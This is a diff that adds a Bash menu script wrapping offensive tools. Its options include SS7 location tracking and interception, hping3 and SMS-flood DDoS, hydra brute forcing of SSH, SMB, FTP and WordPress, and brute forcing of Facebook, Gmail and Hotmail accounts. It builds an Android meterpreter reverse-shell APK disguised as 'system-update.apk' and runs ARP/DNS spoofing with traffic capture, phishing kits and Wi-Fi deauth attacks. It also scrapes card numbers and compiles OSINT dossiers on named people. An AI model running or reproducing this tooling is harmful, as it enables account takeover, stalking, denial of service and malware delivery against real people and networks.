@@ -1,0 +1,1401 @@
+#!/bin/bash
+
+WL='/usr/share/wordlists/rockyou.txt'
+XT='/home/snuff/Desktop/MENU/MODULES/xterm -hold -e'
+MDK4='/home/snuff/Desktop/MENU/MODULES/mdk4'
+MOD_DIR='/home/snuff/Desktop/MENU/MODULES'
+LOG_DIR='/home/snuff/Desktop/MENU/LOGS'
+DNSMASQ='/home/snuff/Desktop/MENU/MODULES/dnsmasq'
+WGETCLONE='wget --mirror -r --convert-links --page-requisites --adjust-extension --save-headers'
+ASK_URL='URL=$(zenity --entry --text="ENTER URL")'
+ASK_PORT='PORT=$(zenity --entry --text="port number")'
+ASK_IP='IP=$(zenity --entry --text="enter ip")'
+FASTBOOT='/home/snuff/Desktop/MENU/MODULES/android/platform-tools/fastboot'
+FILE="zenity --entry --text='path to file'"
+MONITOR_IFACE='ap0'
+INTERNET_IFACE='wlan0'
+INFO='zenity --text-info'
+L='logsave -asv /home/snuff/Desktop/MENU/LOGS/'
+JJ='java -jar'
+ADB='/home/snuff/Desktop/MENU/MODULES/android/platform-tools/./adb'
+#####################################################################################
+####################################################################################################################
+parse_user_options() {
+    while [[ -n "$1" ]]; do
+        case "$1" in
+            --sudo-s)
+            	shift
+            	sudo -s
+            	shift
+            	;;
+            --ss7)
+            	shift
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/mobility/ && java -jar MapMobility.jar client_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar STP.jar stp_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar stp_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar vlr_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar hlr_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar client_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/fraud/ && java -jar MTForwardSMSResp.jar" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/fraud/ && java -jar SendIMSI.jar" &   	
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/AnyTimeInterrogation_Server/ && $JJ AnyTimeInterrogation.jar client_config" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/ProvideSubscriberInfo_Server/ && $JJ ProvideSubscriberInfo.jar" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/SendRoutingInfo_Server && $JJ SendRoutingInfo.jar" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/SendRoutingInfoForGPRS_Server && $JJ SendRoutingInfoForGPRS.jar" &
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/SendRoutingInfoForSM_Server && $JJ SendRoutingInfoForSM.jar" &			
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/interception/ && java -jar UpdateLocation.jar" &
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/diamater/ && java -jar dvdn.jar" & 
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar ss7_ddos.jar" & 
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/sms/ && java -jar SMS.jar client_config" &
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ussd/ && java -jar ussd.jar client_config" &
+            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/call_handling/ && java -jar MapCallhandling.jar client_config" &
+            	shift
+            	;;
+            --ss7-edit-client-config)
+            	shift
+            	nano /home/snuff/Desktop/MENU/MODULES/SS7/client_config
+            	shift
+            	;;
+            --ss7-edit-vlr)
+            	shift
+            	nano /home/snuff/Desktop/MENU/MODULES/SS7/vlr_config
+           	shift
+           	;;
+            --ss7-edit-stp)
+            	shift
+            	nano /home/snuff/Desktop/MENU/MODULES/SS7/stp_config
+            	shift
+            	;;
+            --ss7-edit-hlr)
+            	shift
+            	nano /home/snuff/Desktop/MENU/MODULES/SS7/hlr_config
+            	shift
+            	;;
+            --clone-web)
+                shift
+                $ASK_URL; $WGETCLONE $URL; Photon --clone -u $URL
+                shift
+                ;;
+            --scan-local)
+                shift
+                $XT "arp-scan --localnet" &
+                $XT "netscanner" &
+                $XT "wavemon" &
+                shift
+                ;; 
+            --mac-lookup)
+                shift
+		MAC=$(zenity --entry --text="enter mac address to lookup")
+                cat $MOD_DIR/oui.txt | grep $MAC  
+                shift
+                ;; 
+            --tcp-kill)
+                shift
+                lsof -Pan -i tcp -i udp | $INFO
+                lsof -i -P | grep -i "listen" | $INFO
+                lsof -Pnl -i | $INFO
+                lsof -Pni4 | grep LISTEN | column -t | $INFO
+                $ASK_PORT; kill -9 | $INFO
+                $(lsof -i :$PORT | awk '{l=$2} END {print l}') | $INFO
+                shift
+                ;; 
+            --bypass-web)
+                shift
+                $ASK_URL; gobuster -u $URL -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+                shift
+                ;; 
+            --tcp-con)
+                shift
+                $ASK_IP; $ASK_PORT; citrix $IP $PORT
+                shift
+                ;;                                                                                    
+            --md2html)
+                shift
+                NAME=$(zenity --entry --text="name the html file")
+                MDFILE=$(zenity --entry --text="name the MD file")                
+                markdown-it $MDFILE > $NAME.html
+                shift
+                ;;
+            --file-search)
+                shift
+                OPT=$(zenity --entry --text="OPTIONS: findfile | findword | findext | replacetext | findefolders")
+              	if [[ "$OPT" = "findword" ]]; then
+              	WORD=$(zenity --entry --text="word to search for inside file")                
+                grep -rli $WORD / | $INFO
+              	fi  
+              	if [[ "$OPT" = "findfile" ]]; then
+              	FILE=$(zenity --entry --text="file to search for")                
+                find / -name $FILE | $INFO
+              	fi  
+              	if [[ "$OPT" = "findext" ]]; then
+              	EXTNAME=$(zenity --entry --text="ext to search for")                              	
+                find / -type f -name *$EXTNAME | $INFO
+              	fi  
+              	if [[ "$OPT" = "replacetext" ]]; then
+              	OLDTXT=$(zenity --entry --text="TXT TO REPLACE")  
+              	NEWTXT=$(zenity --entry --text="NEW TXT TO REPLACE") 
+              	FILE=$(zenity --entry --text="enter path to file")                	               	                            	              	
+                sed -i "s/$OLDTXT/$NEWTXT/g" $FILE 
+              	fi
+              	if [[ "$OPT" = "findefolders" ]]; then
+                find / -empty | $INFO
+              	OPT=$(zenity --entry --text="DELETE EMPTY FOLDERS YES/NO")                	               	                            	              	
+		if [[ "${OPT}" = "YES" ]] ; then
+		find / -empty -delete
+		elif [[ "${OPT}" = "NO" ]] ; then
+		exit 0
+		fi
+              	fi            	              	              	              	              	              	           
+                shift
+                ;;                                                                                    
+            --key-log)
+                shift
+                $ASK_IP
+		xspy $IP
+                shift
+                ;;
+            --extract-emails)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $FILE | $INFO
+		grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" $FILE | $INFO
+                shift
+                ;; 
+            --extract-ip)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" $FILE | $INFO
+                shift
+                ;; 
+            --extract-pass)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -i "pwd\|passw" $FILE | $INFO            
+                shift
+                ;; 
+            --extract-users)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -i "user\|invalid\|authentication\|login" $FILE | $INFO               
+                shift
+                ;; 
+            --extract-urls)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep http | grep -shoP 'http.*?[" >]' $FILE | $INFO
+		grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' $FILE | $INFO            
+                shift
+                ;;                                                                                    
+            --extract-cc)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" $FILE | $INFO #VISA
+		grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" $FILE | $INFO #MASTERCARD
+		grep -E -o "\b3[47][0-9]{13}\b" $FILE | $INFO #AE               
+                shift
+                ;;
+            --extract-ss)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" $FILE          
+                shift
+                ;; 
+            --extract-phone)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' $FILE
+                shift
+                ;; 
+            --extract-hash)
+                shift
+		FILE=$(zenity --entry --text="path to file")
+		# Extract hashes
+		#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
+		egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' $FILE | egrep -o '[a-fA-F0-9]{32}'
+		#Extract valid MySQL-Old hashes
+		grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" $FILE
+		#Extract blowfish hashes
+		grep -e '$2a\$\08\$(.){75}' $FILE
+		#Extract Joomla hashes
+		egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" $FILE
+		#Extract VBulletin hashes
+		egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" $FILE
+		#Extraxt phpBB3-MD5
+		egrep -o '$H$S{31}' $FILE
+		#Extract Wordpress-MD5
+		egrep -o '$P$S{31}' $FILE
+		#Extract Drupal 7
+		egrep -o '$S$S{52}' $FILE
+		#Extract old Unix-md5
+		egrep -o '$1$w{8}S{22}' $FILE
+		#Extract md5-apr1
+		egrep -o '$apr1$w{8}S{22}' $FILE
+		#Extract sha512crypt, SHA512(Unix)
+		egrep -o '$6$w{8}S{86}' $FILE               
+                shift
+                ;; 
+            --ddos-halflife)
+                shift
+		$ASK_IP
+	    	halflife $IP 80              
+                shift
+                ;; 
+            --ddos-sms)
+                shift
+		NUM=$(zenity --entry --text="targ NUMBER:")
+		cd $MOD_DIR/Impulse/ && python3 impulse.py --method SMS --time 20 --threads 15 --target +$NUM                
+                shift
+                ;;                                                                                    
+            --ddos-t50)
+                shift
+		$ASK_IP
+		for i in {1..100}; do t50 --protocol T50 $IP; done               
+                shift
+                ;;
+            --ddos-hping3)
+                shift
+                IP=$(zenity --entry --text="targ IP:")
+		hping3 -V -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source $IP
+                shift
+                ;; 
+            --brute-fb)
+                shift
+              	GMAIL=$(zenity --entry --text="enter gmail to brute force facebook:")
+            	FACEBOOKID=$(zenity --entry --text="enter facebook id to brute force:")              
+            	python3 $MOD_DIR/Brute_Force.py -f $FACEBOOKID -l $WL; 
+            	perl $MOD_DIR/Facebooker.pl $GMAIL $WL
+                shift
+                ;; 
+            --brute-twitter)
+                shift
+             	TWITTERID=$(zenity --entry --text="enter twitter id to brute force:")
+            	python3 $MOD_DIR/Brute_Force.py -T $TWITTERID -l $WL               
+                shift
+                ;; 
+            --brute-hotmail)
+                shift
+             	HMAIL=$(zenity --entry --text="enter hotmail to brute force:")
+            	python3 $MOD_DIR/Brute_Force.py -t $HMAIL -l $WL              
+                shift
+                ;; 
+            --brute-gmail)
+                shift
+ 		GMAIL=$(zenity --entry --text="enter gmail to brute force:")
+		python3 $MOD_DIR/Brute_Force.py --gmail $GMAIL -l $WL               
+                shift
+                ;;                                                                                    
+            --create-pwlist)
+                shift
+		DOM=$(zenity --entry --text="enter domain to create password list from")
+		read -p "enter path to html file to create dictionary:" HTML_FILE
+		crunch 6 6 0123456789ABCDEF -o pass.txt
+		cewl $DOM -m 6 -w $DOM.txt
+		html2dic $HTML_FILE                
+                shift
+                ;;
+            --brute-snmp)
+                shift
+ 		read -p "enter targ ip" IP
+		hydra -P $WL -v $IP snmp               
+                shift
+                ;; 
+            --brute-ftp)
+                shift
+ 		read -p "enter targ ip" IP
+		hydra -t 1 -l admin -P $WL -vV $IP ftp               
+                shift
+                ;; 
+            --brute-ssh)
+                shift
+		read -p "enter targ ip" IP
+           	hydra -v -V -u -L $WL -P $WL -t 1 -u $IP ssh
+          	hydra $IP -s 22 ssh -l ADMIN -P $WL                
+                shift
+                ;; 
+            --brute-pop3)
+                shift
+		read -p "enter targ ip" IP
+		hydra -l USERNAME -P $WL -f $IP pop3 -V                
+                shift
+                ;; 
+            --brute-smtp)
+                shift
+ 		read -p "enter targ ip" IP
+		hydra -P $WL $IP smtp -V               
+                shift
+                ;;
+            --brute-smb)
+                shift
+ 		read -p "enter targ ip" IP
+		hydra -t 1 -V -f -l administrator -P $WL $IP smb               
+                shift
+                ;; 
+            --brute-wordpress)
+                shift
+		read -p "enter targ ip" IP
+		hydra -l admin -P $WL $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'                
+                shift
+                ;; 
+            --decode-base64)
+                shift
+ 		read -p "paste base64 string:" DECODE
+		python -m base64 -d <<< "$DECODE"               
+                shift
+                ;; 
+            --encode-base64)
+                shift
+ 		read -p "enter string to encode to base64:" STRING
+		python -m base64 -e <<< "$STRING"               
+                shift
+                ;;                                                                                    
+            --gen-cert)
+                shift
+		cd Desktop &
+		read -p "enter domain to generate cert:" DOM
+		( _fd="domain.key" ; _fd_out="domain.crt" ; _len="2048" ; _days="365" \
+		openssl req -newkey rsa:${_len} -nodes \
+		-keyout ${_fd} -x509 -days ${_days} -out ${_fd_out} )
+		certbot certonly -d $DOM -d www.$DOM              
+                shift
+                ;;
+            --bettercap)
+                shift
+                bettercap
+                shift
+                ;; 
+            --beef)
+                shift
+ 		service apache2 start; beef-xss               
+                shift
+                ;; 
+            --arpspoof)
+                shift
+ 		arp-scan --localnet
+		read -p "targ ip?:" TARG_IP 
+		read -p "ROUTER IP?:" ROUTER_IP
+		$XT "arpspoof -i wlan0 -c both -t $TARG_IP -r $ROUTER_IP" &
+	        $XT "dnsspoof -i wlan0 host $TARG_IP >> $LOG_DIR/sniffedurls.txt" &
+		$XT "tcpdump host $TARG_IP -w $LOG_DIR/arp_tcpdump_capture.pcap" &
+		$XT "ngrep -x -C -o $LOG_DIR/pcap-ngrep host $TARG_IP" &
+		$XT 'ngrep wlan0 -d "www.domain.com" port 443' &
+		$XT 'ngrep -d wlan0 -qt "HTTP" "tcp"' &
+		$XT "tcpick wlan0 -c --separator"
+		#$XT "dsniff -i wlan0 -c -m -w $LOG_DIR/dsniff" &
+		#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 &
+		#$XT "sslstrip -l 8080 -f lock.ico" &               
+                shift
+                ;; 
+            --phish-gophish)
+                shift
+                gophish
+                shift
+                ;;
+            --phish-socialphish)
+                shift
+		cd $MOD_DIR/SocialFish/ && python SocialFish.py                
+                shift
+                ;; 
+            --create-apk)
+                shift
+ 		read -p "enter listener ip your ip" IP
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=5555 R> system-update.apk 		
+		msfconsole \
+		use exploit/multi/handler \
+		set PAYLOAD android/meterpreter/reverse_tcp \
+		set LHOST $IP \
+		set LPORT 5555 \
+		set ExitOnSession false \
+		exploit -j -z
+		               
+                shift
+                ;; 
+            --msf-listener)
+                shift
+         	msfvenom -l all
+ 		read -p "enter your ip to listen on, the listener port is 5555:" IP
+		read -p "enter your payload name ex.. android/meterpreter/reverse_http :" PAYLOAD
+		msfconsole \
+		use exploit/multi/handler \
+		set PAYLOAD $PAYLOAD \
+		set LHOST $IP \
+		set LPORT 5555 \
+		set ExitOnSession false \
+		exploit -j -z        
+                shift
+                ;; 
+            --mitm-router)
+                shift
+                read -p "enter iface to create ap:" IFACE_TO_HOST_AP
+                read -p "enter iface with internet:" IFACE_WITH_INTERNET
+                read -p "set mac addr:" MAC
+       		$MOD_DIR/virt_router -i $IFACE_TO_HOST_AP -o $IFACE_WITH_INTERNET --mac $MAC --log-dns --catch-dns     
+                shift
+                ;;
+            --set-mac)
+                shift
+    		read -p "enter new mac" MAC
+		ifconfig wlan0 down
+		macchanger -m type $MAC wlan0
+		ifconfig wlan0 up	            
+                shift
+                ;; 
+            --random-mac)
+                shift
+                ifconfig wlan0 down; macchanger -r wlan0; ifconfig wlan0 up		     
+                shift
+                ;; 
+            --ip-on)
+                shift
+                echo 1 > /proc/sys/net/ipv4/ip_forward		  
+                shift
+                ;;
+            --ip-off)
+                shift
+            	echo 0 > /proc/sys/net/ipv4/ip_forward	    
+                shift
+                ;;
+            --reject-ip)
+                shift
+        	read -p "enter ip to reject:" IP
+	    	iptables -A INPUT -s $IP -j DENY
+                shift
+                ;; 
+            --rnet)
+                shift
+              	service NetworkManager restart	    		  
+                shift
+                ;; 
+            --http-server)
+                shift
+                python2 -m SimpleHTTPServer 8000	
+                shift
+                ;;
+            --config-kernal)
+                shift
+                sysctl -a; mousepad /etc/sysctl.conf; sysctl -p /etc/sysctl.conf
+                shift
+                ;;
+            --net-info)
+                shift
+                arp; ip route; ifconfig; iwconfig; curl ifconfig.me; ip maddr show; ip neigh
+                nmcli -p -m multiline -f all con show
+                ip addr	
+                shift
+                ;;
+            --loopcmd)
+                shift
+                read -p "enter cmd to loop:" CMD
+	     	for i in {1..100}; do $CMD; done	
+                shift
+                ;; 
+            --scan-sys)
+                shift
+                $L -asv $LOG_DIR/SYSTEM_SCAN "/home/snuff/Desktop/MENU/MODULES/scansys"
+                shift
+                ;; 
+            --start-mon)
+                shift
+               # ifconfig wlan0 down
+               # iw reg set BO
+               #iwconfig wlan0 txpower 30
+                #iwconfig wlan0 mode monitor
+		#macchanger --random wlan0
+		#ifconfig wlan0 up
+		#airmon-ng check kill
+		iw phy0 interface add ap0 type monitor
+		ifconfig ap0 up
+#	airmon-ng start wlan0
+		#iwconfig wlan0 mode monitor  	        	
+		airodump-ng -g -e --band abg --showack -M -W -a -w $LOG_DIR/pcap $MONITOR_IFACE
+                shift
+                ;;
+            --airodump-ng-chsel)
+            	shift
+            	wash -2 -5 -a -U -s -u -i $MONITOR_IFACE		
+        	CH=$(zenity --entry --text="targ CH:")
+                BSSID=$(zenity --entry --text="targ bssid:")        	        	
+		airodump-ng -c $CH --bssid $BSSID -g -e --band abg -c --showack -M -W -a -w $LOG_DIR/pcap $MONITOR_IFACE
+            	shift
+            	;;
+            --stop-mon)
+                shift
+                airmon-ng stop wlan0mon
+                service networking restart
+                service NetworkManager restart
+                shift
+                ;;
+            --create-iface)
+                shift
+                iw phy0 interface add ap0 type monitor 
+		modprobe mac80211_hwsim radios=2 
+		iw phy0 interface add ap1 type __ap
+		ifconfig -a
+		iwconfig
+                shift
+                ;;
+            --create-hotspot)
+                shift
+                read -p " enter ssid" SSID
+		nmcli -s dev wifi hotspot con-name QuickHotspot ssid "$SSID"	
+                shift
+                ;; 
+            --scan-wifi)
+                shift
+                (
+		wash -2 -5 -a -U -s -u -i $MONITOR_IFACE &
+                nmcli device wifi list &
+		iw dev $MONITOR_IFACE scan &
+		nmcli -f all dev wifi list &
+		IWFO='iwlist wlan0' 
+		$IWFO scanning &
+		$IWFO frequency &
+		$IWFO rate &
+		$IWFO keys &
+		$IWFO power &
+		$IWFO txpower &
+		$IWFO event &
+		$IWFO auth &
+		$IWFO wpakeys
+		) > SCAN_RESULTS_WIFI.txt
+                shift
+                ;; 
+            --wps-attack)
+                shift
+                BSSID=$(zenity --entry --text="targ bssid:")
+        	CH=$(zenity --entry --text="targ CH:")
+        	$XT "reaver -i $MONITOR_IFACE -b $BSSID -c $CH -b -f -N -L -d 2 -vvroot; bash" &
+        	$XT "bully $MONITOR_IFACE -b $BSSID -c $CH -S -F -B -v 3; bash" &
+	        $XT "reaver -i $MONITOR_IFACE -b $BSSID -c $CH -K 1 -N -vv; bash" & 
+	        $XT "bully $MONITOR_IFACE -b $BSSID -d -v 3; bash" &
+	        $XT "reaver -i $MONITOR_IFACE -b $BSSID -c $CH -f -N -g 1 -vv -p ''; bash" &  
+                shift
+                ;;
+            --deauth)
+                shift
+                BSSID=$(zenity --entry --text="targ bssid:")
+        	STATION=$(zenity --entry --text="targ station:")
+	        $XT "aireplay-ng --deauth 1000 -a $BSSID $MONITOR_IFACE" &
+	        $XT "aireplay-ng --deauth 1000 -a $BSSID -c $STATION $MONITOR_IFACE"	
+
+                shift
+                ;;
+            --mdk4-a)
+                shift
+                BSSID=$(zenity --entry --text="targ bssid:")
+      	  	$XT "$MDK4 $MONITOR_IFACE a -a $BSSID -s 555555" &
+       	 	$XT "$MDK4 $MONITOR_IFACE a -i $BSSID -s 555555" 	
+                shift
+                ;; 
+            --mdk4-b)
+                shift
+                $XT "$MDK4 $MONITOR_IFACE b"	
+                shift
+                ;; 
+            --mdk4-d)
+                shift
+                $XT "$MDK4 $MONITOR_IFACE d -s 43344434"
+                shift
+                ;; 
+            --mdk4-e)
+                shift
+                BSSID=$(zenity --entry --text="targ bssid:")
+	        $XT "$MDK4 $MONITOR_IFACE e -t $BSSID -l"
+                shift
+                ;;
+            --mdk4-f)
+                shift
+                $XT "$MDK4 $MONITOR_IFACE f -s cabp -m t" &
+		$XT "$MDK4 $MONITOR_IFACE f -s cabp -m s" &
+		$XT "$MDK4 $MONITOR_IFACE f -s cabp -m d" &	
+                shift
+                ;;
+            --mdk4-m)
+                shift
+                BSSID=$(zenity --entry --text="targ bssid:")
+	        $XT "$MDK4 $MONITOR_IFACE m -t $BSSID"
+                shift
+                ;; 
+            --mdk4-p)
+                shift
+                BSSID=$(zenity --entry --text="targ bssid:")
+      	  	SSID=$(zenity --entry --text="targ ssid:")
+      		$XT "$MDK4 $MONITOR_IFACE p -t $BSSID -e $SSID"
+                shift
+                ;; 
+            --mdk4-s)
+                shift
+                AP=$(zenity --entry --text="TARG AP")
+		$XT "$MDK4 $MONITOR_IFACE s -b $AP -s 6555555" & 
+		$XT "$MDK4 $MONITOR_IFACE s -p $AP -s 6555555" &
+                shift
+                ;; 
+            --mdk4-w)
+                shift
+                SSID=$(zenity --entry --text="targ ssid:")
+        	$XT "$MDK4 $MONITOR_IFACE w -e $SSID -z"
+                shift
+                ;;
+            --img-meta)
+                shift
+            	IMG=$(zenity --entry --text="path to img?")
+		exiftool -ALL $IMG && mediainfo --full $IMG
+		exifprobe $IMG                      	
+            	shift
+            	;;
+            --vid-meta)
+            	shift
+           	VID=$(zenity --entry --text="path to VIDEO")            	
+		exiftool -ALL $VID
+		mediainfo --full $VID
+		exifprobe $VID            	
+            	shift
+            	;;
+            --extract-img-from-vid)
+            	shift
+                MP4=$(zenity --entry --text="put mp4 files in /home/snuff/Desktop/MENU/LOGS/ and please enter name of file")
+	     	mkdir ; cd $LOG_DIR/mp4; ffmpeg -i $MP4 -r 1 -f image2 image-%2d.png
+                shift
+                ;;
+             --merge-mp3)
+             	shift
+                MP3=$(zenity --entry --text="PATH TO FIRST .MP3 FILE")
+	     	MP3_2=$(zenity --entry --text="PATH TO SECOND .MP3 FILE")
+	     	OUTPUT=$(zenity --entry --text="NAME OF MERGED .MP3")
+	     	ffmpeg -i $MP3.mp3 -i $MP3_2.mp3 -filter_complex amix=inputs=2:duration=longest $OUTPUT.mp3
+	     	shift
+	     	;;
+              --ytdl)
+              	shift
+                read -p "enter playlist:" PL
+                yt-dlp --extract-audio --audio-format mp3 --yes-playlist $PL
+              	shift
+              	;;
+
+            --collect)
+                shift
+                DOM=$(zenity --width=500 --height=500 --entry --text="ENTER DOMAIN TO SCAN")
+		EMAIL=$(zenity --width=500 --height=500 --entry --text="ENTER EMAIL")
+		PNUMBER=$(zenity --width=500 --height=500 --entry --text="ENTER PHONE NUMBER TO SCAN")
+		FNAME=$(zenity --width=500 --height=500 --entry --text="ENTER FIRST NAME")
+		LNAME=$(zenity --width=500 --height=500 --entry --text="ENTER LAST NAME")
+		SLINK1=$(zenity --width=500 --height=500 --entry --text="ENTER SOCIAL MEDIA URL LINK TO PROFILE")
+		SLINK2=$(zenity --width=500 --height=500 --entry --text="ENTER ANOTHER SOCIAL MEDIA URL LINK TO PROFILE")
+		SLINK3=$(zenity --width=500 --height=500 --entry --text="ENTER ONE LAST SOCIAL MEDIA URL LINK TO PROFILE")
+		LOCATION=$(zenity --width=500 --height=500 --entry --text="ENTER CITY NAME")
+		BDATE=$(zenity --width=500 --height=500 --entry --text="ENTER BIRTHDATE IF KNOWN")
+		LPLATE=$(zenity --width=500 --height=500 --entry --text="ENTER LISENCE PLATE NUMBER")
+		echo $DOM >> /home/snuff/Desktop/TARGET.txt
+		echo $EMAIL >> /home/snuff/Desktop/TARGET.txt
+		echo $PNUMBER >> /home/snuff/Desktop/TARGET.txt
+		echo $FNAME >> /home/snuff/Desktop/TARGET.txt
+		echo $LNAME >> /home/snuff/Desktop/TARGET.txt
+		echo $SLINK1 >> /home/snuff/Desktop/TARGET.txt
+		echo $SLINK2 >> /home/snuff/Desktop/TARGET.txt
+		echo $SLINK3 >> /home/snuff/Desktop/TARGET.txt
+		echo $LOCATION >> /home/snuff/Desktop/TARGET.txt
+		echo $BDATE >> /home/snuff/Desktop/TARGET.txt
+                shift
+                ;;
+              --osint-username)
+                shift
+                USER=$(zenity --entry --text="username to query ex.. john123")  
+		cd $MOD_DIR/SOCIAL_USERNAME_SCRAPE/ && ./maigret.py $USER -a
+		usufy --show_tags -n $USER
+		sherlock --verbose --print-found --nsfw $USER
+		cd $MOD_DIR/ && python blackbird.py -u $USER --show-all
+		social-analyzer --simplify --metadata --extract --profiles detected --username $USER
+		$MOD_DIR/./USR_EMAIL_PHONE_SCAN detect -n $USER --precisely -g --nsfw -v --google
+		socialscan $USER   
+		cd $MOD_DIR/ && python3 infogather.py
+		cd $MOD_DIR/AIO_USR_EMAIL_PHONE_SCRAPE  && python3 MrHolmes.py
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/AIO_USR_EMAIL_PHONE_SCRAPE/GUI/ && php -S 127.0.0.1:80" 
+                shift
+                ;;
+            --osint-phone)
+                shift
+		NUM=$(zenity --entry --text="enter a number to query ex +17055428394:")
+		cd $MOD_DIR && python phone_locator.py $NUM
+		phoneinfoga -n $NUM
+		$MOD_DIR/./USR_EMAIL_PHONE_SCAN detect --phone $NUM --precisely -g --nsfw -v --google
+		cd $MOD_DIR/ && python3 infogather.py
+		cd $MOD_DIR/AIO_USR_EMAIL_PHONE_SCRAPE && python3 MrHolmes.py
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/AIO_USR_EMAIL_PHONE_SCRAPE/GUI/ && php -S 127.0.0.1:80" 
+                shift
+                ;;
+              --osint-email)
+              	shift
+		EMAIL=$(zenity --entry --text="enter email to query:")
+		holehe --only-used $EMAIL 
+        	$MOD_DIR/./USR_EMAIL_PHONE_SCAN detect --email $EMAIL --google --nsfw --precisely 
+		socialscan $EMAIL --show-urls 
+		osrf mailfy -m $EMAIL 
+		curl emailrep.io/$EMAIL
+		cd $MOD_DIR/Zehef/ && python3 zehef.py $EMAIL
+		cd $MOD_DIR/ && python3 infogather.py
+		cd $MOD_DIR/AIO_USR_EMAIL_PHONE_SCRAPE && python3 MrHolmes.py
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/AIO_USR_EMAIL_PHONE_SCRAPE/GUI/ && php -S 127.0.0.1:80" 				              	
+              	shift
+              	;;
+              --osint-f-l-name)
+              	shift
+                read -p "enter first name:" FNAME
+		read -p "enter last name:" LNAME
+		cd $MOD_DIR/DaProfiler/ && python profiler.py -n $FNAME -ln $LNAME
+		cd $MOD_DIR/ && python3 infogather.py
+		cd $MOD_DIR/AIO_USR_EMAIL_PHONE_SCRAPE && python3 MrHolmes.py			
+		$XT "cd /home/snuff/Desktop/MENU/MODULES/AIO_USR_EMAIL_PHONE_SCRAPE/GUI/ && php -S 127.0.0.1:80"            	
+              	shift
+              	;;
+            --plate-lookup)
+                shift
+                firefox https://www.regcheck.org.uk/api/reg.asmx?op=CheckCanada
+                shift
+                ;; 
+            --sim-imsi)
+                shift
+                firefox https://www.numberingplans.com/?page=analysis \
+		https://opencellid.org/#zoom=18&lat=46.34285&lon=-83.923193 \
+		https://cellphonetrackers.org/gsm/gps-tracking.php
+                shift
+                ;; 
+            --domain-scan)
+                shift
+               	read -p "enter domain ex.. demo.com:" DOM
+		read -p "hit enter when ready" ENTER
+		echo | openssl s_client -connect $DOM:443 -showcerts
+		echo | openssl s_client -connect $DOM:443 -showcerts -tlsextdebug -status	
+		dig $DOM 
+		dig $DOM ns # nameserver 
+		dig $DOM mx # mail server 
+		dig $DOM txt # txt 
+		dig $DOM cname # cname	
+		dig $DOM A # ipv4 
+		dig $DOM AAAA # ipv4 	
+		dig @1.1.1.1 $DOM MX
+		dig -axfr $DOM
+
+		nslookup $DOM  # get whole information about the target system 
+		nslookup  -type=A $DOM
+		nslookup -type=mx $DOM 
+		nslookup -type=ns $DOM 
+		nslookup -type=soa $DOM 
+		nslookup -type=txt $DOM 
+		nslookup -type=cname $DOM
+		dnsrecon -d $DOM -j $HOME/Desktop/dnsrecon.json
+		theharvester -d $DOM -b all
+		dnsenum $DOM
+		fierce --domain $DOM
+		dig ANY $DOM
+		dig -x $DOM +noall +answer
+		whois $DOM
+		nslookup $DOM
+		host -a $DOM
+		theHarvester --domain $DOM
+		gobuster dns -d $DOM -i -w $WL
